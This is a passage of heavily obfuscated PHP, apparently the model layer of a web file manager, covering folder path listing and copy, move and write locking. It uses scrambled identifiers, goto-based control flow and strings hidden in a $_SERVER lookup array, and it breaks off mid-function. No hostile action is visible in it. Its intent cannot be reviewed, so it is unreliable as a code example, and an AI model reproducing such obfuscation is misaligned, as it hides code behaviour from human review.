$cù„±Ê±ö[$cŸªß’’Ğ[$dâô’ïù”î[397]]]; if (!is_array($cŸªß’’Ğ[$dâô’ïù”î[460]])) { $cŸªß’’Ğ[$dâô’ïù”î[460]] = array(); } $cŸªß’’Ğ[$dâô’ïù”î[460]][$dâô’ïù”î[511]] = $BáëÖ…Çâ¶[$dâô’ïù”î[505]]; goto d³Ïº²Ê™; d³Ïº²Ê™: $cŸªß’’Ğ[$dâô’ïù”î[408]][$dâô’ïù”î[512]] = $BáëÖ…Çâ¶; $cŸªß’’Ğ[$dâô’ïù”î[408]][$dâô’ïù”î[513]] = $cŸªß’’Ğ[$dâô’ïù”î[514]]; $cŸªß’’Ğ[$dâô’ïù”î[408]][$dâô’ïù”î[515]] = $dâô’ïù”î[87]; goto fµ®½Ûµ™â; fµ®½Ûµ™â: if ($BáëÖ…Çâ¶[$dâô’ïù”î[447]] != $FŸá„„ÏºË) { $cŸªß’’Ğ[$dâô’ïù”î[408]][$dâô’ïù”î[409]] = $cŸªß’’Ğ[$dâô’ïù”î[408]][$dâô’ïù”î[409]] & $BáëÖ…Çâ¶[$dâô’ïù”î[408]][$dâô’ïù”î[408]]; } continue; goto EÚäÅ·÷„; EÚäÅ·÷„: } $bæÆÖ·ÈÑ² = $this->parentLevelArray($cŸªß’’Ğ[$dâô’ïù”î[516]]); $cÃÆŸ¢ç÷´ = array_reverse($bæÆÖ·ÈÑ²); foreach ($cÃÆŸ¢ç÷´ as $eÉäùÖ­¦µ => $F‘Ã­¬‡ï¦) { goto dçÉŒÖÑà; c¦İİß™êÌ: for ($CõÂ·§Ìõã = 0; $CõÂ·§Ìõã < $b×¼ê·–Æê; $CõÂ·§Ìõã++) { if (!isset($fÌÁ˜ƒ‹œç[$bæÆÖ·ÈÑ²[$CõÂ·§Ìõã]])) { $CŸùÆÖëÁø = $dâô’ïù”î[33]; break; } $CŸùÆÖëÁø = $CŸùÆÖëÁø . rtrim($fÌÁ˜ƒ‹œç[$bæÆÖ·ÈÑ²[$CõÂ·§Ìõã]], $dâô’ïù”î[8]) . $dâô’ïù”î[8]; } $cŸªß’’Ğ[$dâô’ïù”î[408]][$dâô’ïù”î[513]] = rtrim($CŸùÆÖëÁø, $dâô’ïù”î[8]) . $dâô’ïù”î[8]; break; goto A¤×ñ©¡µ²; Eôà¿â‡: if ($BáëÖ…Çâ¶[$dâô’ïù”î[447]] != $FŸá„„ÏºË) { $cŸªß’’Ğ[$dâô’ïù”î[408]][$dâô’ïù”î[409]] = $cŸªß’’Ğ[$dâô’ïù”î[408]][$dâô’ïù”î[409]] & $BáëÖ…Çâ¶[$dâô’ïù”î[408]][$dâô’ïù”î[408]]; } $CŸùÆÖëÁø = $dâô’ïù”î[33]; $b×¼ê·–Æê = count($bæÆÖ·ÈÑ²) - $eÉäùÖ­¦µ; goto c¦İİß™êÌ; dçÉŒÖÑà: if (!isset($cù„±Ê±ö[$F‘Ã­¬‡ï¦])) { continue; } $BáëÖ…Çâ¶ = $cù„±Ê±ö[$F‘Ã­¬‡ï¦]; $cŸªß’’Ğ[$dâô’ïù”î[408]][$dâô’ïù”î[512]] = $BáëÖ…Çâ¶; goto Eôà¿â‡; A¤×ñ©¡µ²: } } unset($cŸªß’’Ğ); goto f²”ïœ¶ö; f²”ïœ¶ö: } public function groupPathDisplay(&$eË¸–‹²»¬) { goto F‰ï÷ÀÑ²ª; aÉ÷ì¥ò­Í: $a”ÕËˆİáê = $this->parentLevelArray($aË¢©ØÖ‘İ[$EŞ‘¡ÉÕŒê[516]]); $dÂÕ§ÖÜ = $EŞ‘¡ÉÕŒê[33]; foreach ($a”ÕËˆİáê as $f¥·‹‡ÖÇ˜) { $a‹Şî¶ÁÜ­ = Model($EŞ‘¡ÉÕŒê[517])->getInfo($f¥·‹‡ÖÇ˜); $dÂÕ§ÖÜ .= $a‹Şî¶ÁÜ­[$EŞ‘¡ÉÕŒê[85]][$EŞ‘¡ÉÕŒê[397]] . $EŞ‘¡ÉÕŒê[47]; } goto b’°íéÍ¶; dƒÁĞäïÂğ: $eË¸–‹²»¬[$EŞ‘¡ÉÕŒê[522]] = $dÂÕ§ÖÜ . $aË¢©ØÖ‘İ[$EŞ‘¡ÉÕŒê[85]][$EŞ‘¡ÉÕŒê[397]]; goto böÁØ‚¨Ë; F‰ï÷ÀÑ²ª: $EŞ‘¡ÉÕŒê =& $_SERVER[›èö’ù¤]; if ($eË¸–‹²»¬[$EŞ‘¡ÉÕŒê[406]] != self::TYPE_GROUP) { return; } $aË¢©ØÖ‘İ = Model($EŞ‘¡ÉÕŒê[517])->getInfo($eË¸–‹²»¬[$EŞ‘¡ÉÕŒê[499]]); goto aÉ÷ì¥ò­Í; b’°íéÍ¶: $eË¸–‹²»¬[$EŞ‘¡ÉÕŒê[518]] = $aË¢©ØÖ‘İ[$EŞ‘¡ÉÕŒê[493]]; $eË¸–‹²»¬[$EŞ‘¡ÉÕŒê[519]] = $aË¢©ØÖ‘İ[$EŞ‘¡ÉÕŒê[516]]; $eË¸–‹²»¬[$EŞ‘¡ÉÕŒê[520]] = $aË¢©ØÖ‘İ[$EŞ‘¡ÉÕŒê[521]]; goto dƒÁĞäïÂğ; böÁØ‚¨Ë: } protected function _listAppendPath(&$bõŞ½ËÂº, $AšØ…³éŸğ = false) { goto b×šÜ¦ÒÈ; b«çİêòÆ: unset($EÙŞ·³Õë‘); return $bõŞ½ËÂº; goto C¢™õø¨…; b×šÜ¦ÒÈ: $B¬š”Ò†¹“ =& $_SERVER[›èö’ù¤]; static $Fö¹äæ¡ = array(); $A‘¦í»Ïù = array(); goto Dìêêã…‚Ÿ; f¿­‹¨Œåœ: $E•ˆì¸ÌŠ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $DÕèÒÂ°Ñ = array(); foreach ($bõŞ½ËÂº as &$EÙŞ·³Õë‘) { goto Aä¬ãâ±®°; Aä¬ãâ±®°: $c•ù°Û…‚ = $EÙŞ·³Õë‘[$B¬š”Ò†¹“[516]]; $B”–Ó—Şîˆ = $B¬š”Ò†¹“[33]; if (isset($DÕèÒÂ°Ñ[$c•ù°Û…‚])) { $B”–Ó—Şîˆ = $DÕèÒÂ°Ñ[$c•ù°Û…‚]; } else { $DÎŒŒĞÉßò = $this->parentLevelArray($EÙŞ·³Õë‘[$B¬š”Ò†¹“[516]]); foreach ($DÎŒŒĞÉßò as $DÉ›²«Í†ë => $C…¸í¹®İó) { if (isset($Fö¹äæ¡[$C…¸í¹®İó])) { $B”–Ó—Şîˆ .= $Fö¹äæ¡[$C…¸í¹®İó] . $B¬š”Ò†¹“[8]; } } $DÕèÒÂ°Ñ[$c•ù°Û…‚] = $B”–Ó—Şîˆ; } goto aù±Ã‹ö‚; Aó‡æõØÁ„: if ($EÙŞ·³Õë‘[$B¬š”Ò†¹“[493]] == $B¬š”Ò†¹“[191]) { $EÙŞ·³Õë‘[$B¬š”Ò†¹“[28]] = trim($Fö¹äæ¡[$EÙŞ·³Õë‘[$B¬š”Ò†¹“[397]]], $B¬š”Ò†¹“[8]); $EÙŞ·³Õë‘[$B¬š”Ò†¹“[514]] = $EÙŞ·³Õë‘[$B¬š”Ò†¹“[28]] . $B¬š”Ò†¹“[8]; } if (intval($EÙŞ·³Õë‘[$B¬š”Ò†¹“[406]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($EÙŞ·³Õë‘, $DÎŒŒĞÉßò, $E•ˆì¸ÌŠ); } goto fÂ¶Û…ÁÉ†; aù±Ã‹ö‚: $B”–Ó—Şîˆ .= $EÙŞ·³Õë‘[$B¬š”Ò†¹“[28]]; if ($EÙŞ·³Õë‘[$B¬š”Ò†¹“[405]] == $B¬š”Ò†¹“[87]) { $B”–Ó—Şîˆ .= $B¬š”Ò†¹“[8]; } $EÙŞ·³Õë‘[$B¬š”Ò†¹“[514]] = str_replace($B¬š”Ò†¹“[524], $B¬š”Ò†¹“[8], $B”–Ó—Şîˆ); goto Aó‡æõØÁ„; fÂ¶Û…ÁÉ†: } goto b«çİêòÆ; Fô‰¢ãÍ²§: unset($EÙŞ·³Õë‘); $A‘¦í»Ïù = array_unique($A‘¦í»Ïù); if (count($A‘¦í»Ïù) > 0) { $E²ï¶Ê½ÓÆ = array($B¬š”Ò†¹“[412] => array($B¬š”Ò†¹“[413], $A‘¦í»Ïù)); if (count($A‘¦í»Ïù) == 1) { $aÏºßÅ©ˆß = $this->sourceInfo($A‘¦í»Ïù[0]); $DÎí”öƒ = is_array($aÏºßÅ©ˆß) ? array($aÏºßÅ©ˆß) : !1; } else { $DÎí”öƒ = $this->field($B¬š”Ò†¹“[523])->where($E²ï¶Ê½ÓÆ)->select(); } if (!$DÎí”öƒ) { $DÎí”öƒ = array(); } foreach ($DÎí”öƒ as $CÊ– îã¸ï) { $Fö¹äæ¡[$CÊ– îã¸ï[$B¬š”Ò†¹“[397]]] = $CÊ– îã¸ï[$B¬š”Ò†¹“[28]]; } } goto f¿­‹¨Œåœ; Dìêêã…‚Ÿ: $D´¨µ‡Çİ = array(); if ($AšØ…³éŸğ) { return $Fö¹äæ¡; } foreach ($bõŞ½ËÂº as &$EÙŞ·³Õë‘) { goto cèÏğ¡–ÁÁ; a²Ó°¡ì²: foreach ($DÎŒŒĞÉßò as $DÉ›²«Í†ë => $C…¸í¹®İó) { if (isset($Fö¹äæ¡[$C…¸í¹®İó])) { continue; } if ($DÉ›²«Í†ë == 0) { $Fö¹äæ¡[$C…¸í¹®İó] = $this->_listAppendPathRoot($EÙŞ·³Õë‘, $DÎŒŒĞÉßò); } if ($DÉ›²«Í†ë != 0) { $A‘¦í»Ïù[] = $C…¸í¹®İó; } } goto eÆÄŸ³ÇØ; cèÏğ¡–ÁÁ: $cñ»øÂ‡ŠÛ = $EÙŞ·³Õë‘[$B¬š”Ò†¹“[397]]; if ($EÙŞ·³Õë‘[$B¬š”Ò†¹“[405]] == $B¬š”Ò†¹“[87] && $EÙŞ·³Õë‘[$B¬š”Ò†¹“[493]] != 0) { $Fö¹äæ¡[$cñ»øÂ‡ŠÛ] = $EÙŞ·³Õë‘[$B¬š”Ò†¹“[28]]; } if ($EÙŞ·³Õë‘[$B¬š”Ò†¹“[405]] == $B¬š”Ò†¹“[87] && $EÙŞ·³Õë‘[$B¬š”Ò†¹“[493]] == 0 && !isset($Fö¹äæ¡[$cñ»øÂ‡ŠÛ])) { $Fö¹äæ¡[$cñ»øÂ‡ŠÛ] = $this->_listAppendPathRoot($EÙŞ·³Õë‘, array()); } goto D’±··©‚‰; D’±··©‚‰: if (isset($D´¨µ‡Çİ[$EÙŞ·³Õë‘[$B¬š”Ò†¹“[516]]])) { continue; } $D´¨µ‡Çİ[$EÙŞ·³Õë‘[$B¬š”Ò†¹“[516]]] = !0; $DÎŒŒĞÉßò = $this->parentLevelArray($EÙŞ·³Õë‘[$B¬š”Ò†¹“[516]]); goto a²Ó°¡ì²; eÆÄŸ³ÇØ: } goto Fô‰¢ãÍ²§; C¢™õø¨…: } private function _listAppendPathRecycle(&$BßŸ¨áŞ¸¼, $b¾¥ä Ùô, $D×Û£à¾ôÁ) { goto F¶‘íµõÁº; b‰åíŞÈï—: if ($BßŸ¨áŞ¸¼[$A×´Å®˜³[397]] == $D×Û£à¾ôÁ) { $BßŸ¨áŞ¸¼[$A×´Å®˜³[516]] = $A×´Å®˜³[526]; $BßŸ¨áŞ¸¼[$A×´Å®˜³[493]] = $A×´Å®˜³[191]; $BßŸ¨áŞ¸¼[$A×´Å®˜³[28]] = LNG($A×´Å®˜³[525]); } $BßŸ¨áŞ¸¼[$A×´Å®˜³[527]] = $A×´Å®˜³[528]; goto FêŒÒµØÒ; d«÷ÄÏ¬Ñ: $CÔ¶ßÏåÀ— = implode($A×´Å®˜³[8], array_slice($Fó¤öÓİ­, 2)); $BßŸ¨áŞ¸¼[$A×´Å®˜³[514]] = $A×´Å®˜³[8] . LNG($A×´Å®˜³[525]) . $A×´Å®˜³[8] . ltrim($CÔ¶ßÏåÀ—, $A×´Å®˜³[8]); $BßŸ¨áŞ¸¼[$A×´Å®˜³[516]] = $A×´Å®˜³[526] . implode($A×´Å®˜³[47], array_slice($b¾¥ä Ùô, 1)) . $A×´Å®˜³[47]; goto b‰åíŞÈï—; F¶‘íµõÁº: $A×´Å®˜³ =& $_SERVER[›èö’ù¤]; if (!in_array($D×Û£à¾ôÁ, $b¾¥ä Ùô) && $BßŸ¨áŞ¸¼[$A×´Å®˜³[397]] != $D×Û£à¾ôÁ) { return; } $Fó¤öÓİ­ = explode($A×´Å®˜³[8], trim($BßŸ¨áŞ¸¼[$A×´Å®˜³[514]], $A×´Å®˜³[8])); goto d«÷ÄÏ¬Ñ; FêŒÒµØÒ: } protected function _listAppendPathRoot(&$e£ííî±², $e›Ø¸‹ßò) { $Cİá³Š¹ =& $_SERVER[›èö’ù¤]; $AÓÏ‰¶Ñª = $Cİá³Š¹[33]; if ($e£ííî±²[$Cİá³Š¹[406]] == self::TYPE_USER) { if (defined($Cİá³Š¹[469]) && $e£ííî±²[$Cİá³Š¹[499]] == USER_ID) { $AÓÏ‰¶Ñª = LNG($Cİá³Š¹[529]); if (!$e›Ø¸‹ßò) { $e£ííî±²[$Cİá³Š¹[28]] = $AÓÏ‰¶Ñª; } } else { $EòáÁÀ‡º = Model($Cİá³Š¹[508])->getInfoSimple($e£ííî±²[$Cİá³Š¹[499]]); $AÓÏ‰¶Ñª = LNG($Cİá³Š¹[530]) . $Cİá³Š¹[160] . $EòáÁÀ‡º[$Cİá³Š¹[28]] . $Cİá³Š¹[531]; } } else { if ($e£ííî±²[$Cİá³Š¹[406]] == self::TYPE_GROUP) { $EòáÁÀ‡º = Model($Cİá³Š¹[517])->getInfoSimple($e£ííî±²[$Cİá³Š¹[499]]); $AÓÏ‰¶Ñª = $EòáÁÀ‡º[$Cİá³Š¹[28]]; } else { if ($e£ííî±²[$Cİá³Š¹[406]] == self::TYPE_SYSTEM) { $AÓÏ‰¶Ñª = $Cİá³Š¹[532]; } } } $AÓÏ‰¶Ñª = $AÓÏ‰¶Ñª ? $Cİá³Š¹[8] . $AÓÏ‰¶Ñª . $Cİá³Š¹[8] : $Cİá³Š¹[8]; return $AÓÏ‰¶Ñª; } protected function _listAppendUser(&$FÈÄ£Úº˜Ë) { goto DØÊ¢•Ø; DØÊ¢•Ø: $E†·Şëœ”« =& $_SERVER[›èö’ù¤]; $F¯„ÊÖ’ ¯ = array_to_keyvalue($FÈÄ£Úº˜Ë, $E†·Şëœ”«[33], $E†·Şëœ”«[447]); $C§„¦İÔ©­ = array_to_keyvalue($FÈÄ£Úº˜Ë, $E†·Şëœ”«[33], $E†·Şëœ”«[449]); goto dì‰’·‹ê; Eµ‚†§’ÛÇ: unset($B§¸¹âÎª); goto fóŠ°ìœàæ; dì‰’·‹ê: $F«Ä ¯ÖØš = array_merge($F¯„ÊÖ’ ¯, $C§„¦İÔ©­); $aËİÙÚÉ‰ = Model($E†·Şëœ”«[533])->userListInfo($F«Ä ¯ÖØš); foreach ($FÈÄ£Úº˜Ë as &$B§¸¹âÎª) { $Aºªİ­¼áË = $B§¸¹âÎª[$E†·Şëœ”«[447]]; $B§¸¹âÎª[$E†·Şëœ”«[447]] = $aËİÙÚÉ‰[$Aºªİ­¼áË] ? $aËİÙÚÉ‰[$Aºªİ­¼áË] : !1; $Aºªİ­¼áË = $B§¸¹âÎª[$E†·Şëœ”«[449]]; $B§¸¹âÎª[$E†·Şëœ”«[449]] = $aËİÙÚÉ‰[$Aºªİ­¼áË] ? $aËİÙÚÉ‰[$Aºªİ­¼áË] : !1; if (isset($B§¸¹âÎª[$E†·Şëœ”«[460]]) && $B§¸¹âÎª[$E†·Şëœ”«[460]][$E†·Şëœ”«[534]]) { $FøÉÔ¨çŠ = $GLOBALS[$E†·Şëœ”«[6]][$E†·Şëœ”«[88]][$E†·Şëœ”«[535]]; if ($B§¸¹âÎª[$E†·Şëœ”«[460]][$E†·Şëœ”«[536]] <= time() - $FøÉÔ¨çŠ) { $this->metaSet($B§¸¹âÎª[$E†·Şëœ”«[397]], $E†·Şëœ”«[534], null); $this->metaSet($B§¸¹âÎª[$E†·Şëœ”«[397]], $E†·Şëœ”«[536], null); unset($B§¸¹âÎª[$E†·Şëœ”«[460]][$E†·Şëœ”«[534]]); continue; } $f±Æ®¾‰äï = $B§¸¹âÎª[$E†·Şëœ”«[460]][$E†·Şëœ”«[534]]; $B§¸¹âÎª[$E†·Şëœ”«[460]][$E†·Şëœ”«[537]] = Model($E†·Şëœ”«[533])->getInfoSimpleOuter($f±Æ®¾‰äï); } } goto Eµ‚†§’ÛÇ; fóŠ°ìœàæ: } public function parentLevelArray($E‚ÍÚÀÓ—ò) { $côïàæ«Õò =& $_SERVER[›èö’ù¤]; $E‚ÍÚÀÓ—ò = explode($côïàæ«Õò[47], trim($E‚ÍÚÀÓ—ò, $côïàæ«Õò[47])); return array_remove_value($E‚ÍÚÀÓ—ò, $côïàæ«Õò[191]); } public function listAll($bœ¥œÄğ‡î) { goto a©ªƒŠÃŒã; B¿Œòç´£„: $b‰–ÁÇÄò = $aİê²£ËŞ[542]; $dª½ğ¡Æ¶ = "\x4c\x45\106\124\x20\x4a\x4f\111\x4e\x20{$this->tablePrefix}\151\x6f\137\146\151\154\145\40\x66\x69\x6c\x65\x20\x6f\156\x20\163\x6f\165\x72\x63\145\56\146\151\154\x65\x49\104\x20\x3d\40\x66\151\x6c\145\x2e\x66\151\154\x65\111\x44"; $D†ÀÆäëà™ = $this->alias($aİê²£ËŞ[439])->field($b‰–ÁÇÄò)->where($D¼ßÈòÑÚŠ)->join($dª½ğ¡Æ¶)->select(); goto Cß‹Ûåô²; EïÂ‘ßŞª: $e·Ô˜ã§¿ = array(); foreach ($D†ÀÆäëà™ as $bß­£êÄ” => $DÚÀŒ¶Ê¨) { goto f–¼‰é·»ï; c‡ÀœÇÊ: for ($Cˆ«ˆïìæŸ = 0; $Cˆ«ˆïìæŸ < count($DÕƒ…î¿Ü¾); $Cˆ«ˆïìæŸ++) { $AÉÁ¬‰±œ .= $D†ÀÆäëà™[$DÕƒ…î¿Ü¾[$Cˆ«ˆïìæŸ]][$aİê²£ËŞ[28]] . $aİê²£ËŞ[8]; } $AÉÁ¬‰±œ .= $DÚÀŒ¶Ê¨[$aİê²£ËŞ[28]]; if ($DÚÀŒ¶Ê¨[$aİê²£ËŞ[405]]) { $AÉÁ¬‰±œ .= $aİê²£ËŞ[8]; } goto dÄªÁ…Ÿ•; f–¼‰é·»ï: $DÕƒ…î¿Ü¾ = $this->parentLevelArray($DÚÀŒ¶Ê¨[$aİê²£ËŞ[516]]); array_shift($DÕƒ…î¿Ü¾); $AÉÁ¬‰±œ = $fÍš¼¾ã°—; goto c‡ÀœÇÊ; e™²‰ÃÒæ’: if (!$DÚÀŒ¶Ê¨[$aİê²£ËŞ[405]]) { $a¼›İÎ¯óÊ[$aİê²£ËŞ[462]] = $DÚÀŒ¶Ê¨[$aİê²£ËŞ[462]]; $a¼›İÎ¯óÊ[$aİê²£ËŞ[86]] = $DÚÀŒ¶Ê¨[$aİê²£ËŞ[76]]; } $e·Ô˜ã§¿[] = $a¼›İÎ¯óÊ; goto côî½å¾Õï; dÄªÁ…Ÿ•: $AÉÁ¬‰±œ = str_replace($aİê²£ËŞ[524], $aİê²£ËŞ[8], $AÉÁ¬‰±œ); $AÉÁ¬‰±œ = str_replace($aİê²£ËŞ[524], $aİê²£ËŞ[8], $AÉÁ¬‰±œ); $a¼›İÎ¯óÊ = array($aİê²£ËŞ[416] => str_replace($aİê²£ËŞ[524], $aİê²£ËŞ[8], $AÉÁ¬‰±œ), $aİê²£ËŞ[543] => intval($DÚÀŒ¶Ê¨[$aİê²£ËŞ[405]]), $aİê²£ËŞ[85] => $this->pathInfoFilter($DÚÀŒ¶Ê¨)); goto e™²‰ÃÒæ’; côî½å¾Õï: } return $e·Ô˜ã§¿; goto cŸËğõ³«Š; cÃĞ­³Ê¢Ã: $D†ÀÆäëà™ = array_to_keyvalue($D†ÀÆäëà™, $aİê²£ËŞ[397]); $fÍš¼¾ã°— = "\57{$aÔİŸ‰‚©Õ[$aİê²£ËŞ[28]]}\57"; $fÍš¼¾ã°— = $fÍš¼¾ã°— == $aİê²£ËŞ[524] ? $aİê²£ËŞ[8] : $fÍš¼¾ã°—; goto EïÂ‘ßŞª; a©ªƒŠÃŒã: $aİê²£ËŞ =& $_SERVER[›èö’ù¤]; $aÔİŸ‰‚©Õ = $this->sourceInfo($bœ¥œÄğ‡î); $D¼ßÈòÑÚŠ = array($aİê²£ËŞ[538] => array($aİê²£ËŞ[539], $aÔİŸ‰‚©Õ[$aİê²£ËŞ[516]] . $bœ¥œÄğ‡î . $aİê²£ËŞ[540]), $aİê²£ËŞ[541] => 0); goto B¿Œòç´£„; Cß‹Ûåô²: $this->_listAppendAuth($D†ÀÆäëà™); $this->_listAppendUser($D†ÀÆäëà™); $this->_listAppendPath($D†ÀÆäëà™); goto cÃĞ­³Ê¢Ã; cŸËğõ³«Š: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($c¤Õ§”Ø¡Â) { goto C™·º¼»îİ; C™·º¼»îİ: $A‡§²é¬Ğ» =& $_SERVER[›èö’ù¤]; if (!$this->allowLock()) { return; } $this->_lockCheck($A‡§²é¬Ğ»[544], $c¤Õ§”Ø¡Â); goto A›“èß¹›; A›“èß¹›: $dŠŸà‡†Ôƒ = 1; $this->_lockEvent($c¤Õ§”Ø¡Â, array($A‡§²é¬Ğ»[545], $A‡§²é¬Ğ»[546]), $dŠŸà‡†Ôƒ); $this->_lockParent($c¤Õ§”Ø¡Â, array($A‡§²é¬Ğ»[546]), $dŠŸà‡†Ôƒ); goto C‚ŒÊ’‹£å; C‚ŒÊ’‹£å: $this->_lockEvent($c¤Õ§”Ø¡Â, array($A‡§²é¬Ğ»[547], $A‡§²é¬Ğ»[548]), $dŠŸà‡†Ôƒ); $this->_lockCheckEnd($A‡§²é¬Ğ»[544], $c¤Õ§”Ø¡Â); goto d¥†ŸğÃÀÁ; d¥†ŸğÃÀÁ: } public function lockCopyEnd($Bˆ´ŒÌœ‹ö) { $Cä½’…Î†Á =& $_SERVER[›èö’ù¤]; if (!$this->allowLock()) { return; } $cóÒ‘º©ƒ = 0; $this->_lockEvent($Bˆ´ŒÌœ‹ö, array($Cä½’…Î†Á[545], $Cä½’…Î†Á[546]), $cóÒ‘º©ƒ); $this->_lockParent($Bˆ´ŒÌœ‹ö, array($Cä½’…Î†Á[546]), $cóÒ‘º©ƒ); $this->_lockEvent($Bˆ´ŒÌœ‹ö, array($Cä½’…Î†Á[547], $Cä½’…Î†Á[548]), $cóÒ‘º©ƒ); } public function lockWriteStart($B¬àöÁ®×¡, $d‰î‰ßĞá = '') { goto D¸î¡Å†—; FÙ¢ÃàÆÖà: $this->_lockParent($B¬àöÁ®×¡, array($D×Íª©‘»[544], $D×Íª©‘»[546]), $cêØ–øÀ); $this->_lockCheckEnd($D×Íª©‘»[545], $B¬àöÁ®×¡); goto b¡™¡Ã‡»‡; D¸î¡Å†—: $D×Íª©‘» =& $_SERVER[›èö’ù¤]; if (!$this->allowLock()) { return; } $this->_lockCheck($D×Íª©‘»[545], $B¬àöÁ®×¡); goto b¢†É‘Ô¿; b¢†É‘Ô¿: $cêØ–øÀ = 1; $this->_lockKey($D×Íª©‘»[549] . $B¬àöÁ®×¡ . $D×Íª©‘»[95] . $d‰î‰ßĞá, $cêØ–øÀ); $this->_lockEvent($B¬àöÁ®×¡, array($D×Íª©‘»[544], $D×Íª©‘»[546]), $cêØ–øÀ); goto FÙ¢ÃàÆÖà; b¡™¡Ã‡»‡: } public function lockWriteEnd($FëèÖ¬³Õ”, $EöË‹Š¦Óæ = '') { $Aæ„×íš“ğ =& $_SERVER[›èö’ù¤]; if (!$this->allowLock()) { return; } $F’Œ Ò‚á = 0; $this->_lockKey($Aæ„×íš“ğ[549] . $FëèÖ¬³Õ” . $Aæ„×íš“ğ[95] . $EöË‹Š¦Óæ, $F’Œ Ò‚á); $this->_lockEvent($FëèÖ¬³Õ”, array($Aæ„×íš“ğ[544], $Aæ„×íš“ğ[546]), $F’Œ Ò‚á); $this->_lockParent($FëèÖ¬³Õ”, array($Aæ„×íš“ğ[544], $Aæ„×íš“ğ[546]), $F’Œ Ò‚á); } public function lockMoveStart($BŒÌ›ÛŸß•) { goto E‡Òˆğ§†; dÊïÂÏ¢ªÁ: $this->_lockParent($BŒÌ›ÛŸß•, array($a„èä¸Úßš[544], $a„èä¸Úßš[546]), $DŠ°èøÀ); $this->_lockEvent($BŒÌ›ÛŸß•, array($a„èä¸Úßš[551], $a„èä¸Úßš[547], $a„èä¸Úßš[548]), $DŠ°èøÀ); $this->_lockCheckEnd($a„èä¸Úßš[546], $BŒÌ›ÛŸß•); goto E¯³¾ÄÜßµ; CŒ‚¥é–¸—: $DŠ°èøÀ = 1; $this->_lockKey($a„èä¸Úßš[550] . $BŒÌ›ÛŸß•, $DŠ°èøÀ); $this->_lockEvent($BŒÌ›ÛŸß•, array($a„èä¸Úßš[544], $a„èä¸Úßš[545]), $DŠ°èøÀ); goto dÊïÂÏ¢ªÁ; E‡Òˆğ§†: $a„èä¸Úßš =& $_SERVER[›èö’ù¤]; if (!$this->allowLock()) { return; } $this->_lockCheck($a„èä¸Úßš[546], $BŒÌ›ÛŸß•); goto CŒ‚¥é–¸—; E¯³¾ÄÜßµ: } public function lockMoveEnd($A¹‡®…èƒã) { goto C…Øçµ¾; bØ»Ü²õ„È: $this->_lockEvent($A¹‡®…èƒã, array($c…¬òœÄ¿ö[551], $c…¬òœÄ¿ö[547], $c…¬òœÄ¿ö[548]), $bÑãÍÅğó™); goto eÖòäÆª“•; C…Øçµ¾: $c…¬òœÄ¿ö =& $_SERVER[›èö’ù¤]; if (!$this->allowLock()) { return; } $bÑãÍÅğó™ = 0; goto Fê×é–—ê; Fê×é–—ê: $this->_lockKey($c…¬òœÄ¿ö[550] . $A¹‡®…èƒã, $bÑãÍÅğó™); $this->_lockEvent($A¹‡®…èƒã, array($c…¬òœÄ¿ö[544], $c…¬òœÄ¿ö[545]), $bÑãÍÅğó™); $this->_lockParent($A¹‡®…èƒã, array($c…¬òœÄ¿ö[544], $c…¬òœÄ¿ö[546]), $bÑãÍÅğó™); goto bØ»Ü²õ„È; eÖòäÆª“•: } private function _lockCheck($DÇ°Õï×™, $D‹¸ÖğØÁˆ) { goto dèëåöÛ½; cÙĞ½ùÑºº: $this->_lockTimeStart[$a‰Î›¾†§”] = timeFloat(); if (!is_array($B„±½§ÓÒ)) { return; } $bŒ®¼¶£•õ = LNG($FµŸãƒÚğÆ[552]); goto f¤âÉ†ˆÊ¹; f¤âÉ†ˆÊ¹: CacheLock::setErrorMsg($FµŸãƒÚğÆ[160] . htmlspecialchars($B„±½§ÓÒ[$FµŸãƒÚğÆ[28]]) . $FµŸãƒÚğÆ[531] . $bŒ®¼¶£•õ); $this->_lockKey($a‰Î›¾†§”, 1); $this->_lockKey($a‰Î›¾†§”, 0); goto cØ…‹–†Ş; dèëåöÛ½: $FµŸãƒÚğÆ =& $_SERVER[›èö’ù¤]; $B„±½§ÓÒ = $this->sourceInfo($D‹¸ÖğØÁˆ); $a‰Î›¾†§” = $DÇ°Õï×™ . $FµŸãƒÚğÆ[95] . $D‹¸ÖğØÁˆ; goto cÙĞ½ùÑºº; cØ…‹–†Ş: $DãÄé±•´‘ = array_reverse($this->parentLevelArray($B„±½§ÓÒ[$FµŸãƒÚğÆ[516]])); foreach ($DãÄé±•´‘ as $aŞ¹ÙŒÙÊ) { $a‰Î›¾†§” = $DÇ°Õï×™ . $FµŸãƒÚğÆ[553] . $aŞ¹ÙŒÙÊ; if (CacheLock::lockGet($FµŸãƒÚğÆ[554] . $a‰Î›¾†§”)) { $B„±½§ÓÒ = $this->sourceInfo($aŞ¹ÙŒÙÊ); CacheLock::setErrorMsg($FµŸãƒÚğÆ[160] . htmlspecialchars($B„±½§ÓÒ[$FµŸãƒÚğÆ[28]]) . $FµŸãƒÚğÆ[531] . $bŒ®¼¶£•õ); $this->_lockKey($a‰Î›¾†§”, 1); $this->_lockKey($a‰Î›¾†§”, 0); } } goto a ™­Ìãµá; a ™­Ìãµá: } private function _lockCheckEnd($CÙ˜Ôñ´ã, $añì÷Ò™½) { goto E‰¥á—´á; Fó“ªæáæÊ: if (!isset($this->_lockTimeStart[$bùÚã¥«³š])) { return; } $B¡ºÃ‰à¯Ë = timeFloat() - $this->_lockTimeStart[$bùÚã¥«³š]; unset($this->_lockTimeStart[$bùÚã¥«³š]); goto A¢ˆ‰÷Ğ™¿; A¢ˆ‰÷Ğ™¿: if ($B¡ºÃ‰à¯Ë > 0.5) { unset(self::$cacheSourceInfo[$bÍ©ó ÆË¾[453] . $añì÷Ò™½]); } $F‹ˆ©¢Ò•× = $this->sourceInfo($añì÷Ò™½); if (!$F‹ˆ©¢Ò•×) { show_json(LNG($bÍ©ó ÆË¾[105]), !1); } goto C¶¿ù÷İµÍ; E‰¥á—´á: $bÍ©ó ÆË¾ =& $_SERVER[›èö’ù¤]; $bùÚã¥«³š = $CÙ˜Ôñ´ã . $bÍ©ó ÆË¾[95] . $añì÷Ò™½; CacheLock::setErrorMsg($bÍ©ó ÆË¾[376]); goto Fó“ªæáæÊ; C¶¿ù÷İµÍ: } private function _lockParent($BÓÜå¹¨Ñ, $cùÈñçŒìŸ, $BÖçŞ¤×èï) { if (!$this->autoLockSet) { return; } $dÕ–»šƒ½¥ = $this->sourceInfo($BÓÜå¹¨Ñ); if (!is_array($dÕ–»šƒ½¥)) { return; } 